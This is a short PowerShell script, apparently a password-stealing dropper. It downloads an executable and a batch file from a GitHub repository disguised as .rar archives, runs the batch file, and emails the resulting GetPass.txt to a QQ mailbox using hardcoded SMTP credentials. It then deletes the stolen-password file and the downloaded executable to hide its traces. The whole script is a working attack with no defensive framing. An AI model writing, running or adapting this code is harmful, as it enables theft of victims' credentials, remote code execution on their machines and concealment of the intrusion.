(new-object System.Net.WebClient).DownloadFile('https://github.com/niburenshiwodanshiworenshini/-/GetPass.rar','D:\Get.exe');

(new-object System.Net.WebClient).DownloadFile('https://github.com/niburenshiwodanshiworenshini/-/Command.rar','D:\Command.bat');

D:\Command.bat;
$SMTPServer = 'smtp.qq.com'

$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)

$SMTPInfo.EnableSsl = $true 

$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('1716313092@qq.com', 'olawg1716313092');

$ReportEmail = New-Object System.Net.Mail.MailMessage

$ReportEmail.From = '1716313092@qq.com'

$ReportEmail.To.Add('1716313092@qq.com')

$ReportEmail.Subject = 'GetPass'

$ReportEmail.Body = 'GetPass_text'  

$ReportEmail.Attachments.Add('D:\GetPass.txt')
$SMTPInfo.Timeout = 1000000
$SMTPInfo.Send($ReportEmail)
$ReportEmail.Attachments.Dispose()

remove-item 'D:\GetPass.txt'

remove-item 'D:\Get.exe'
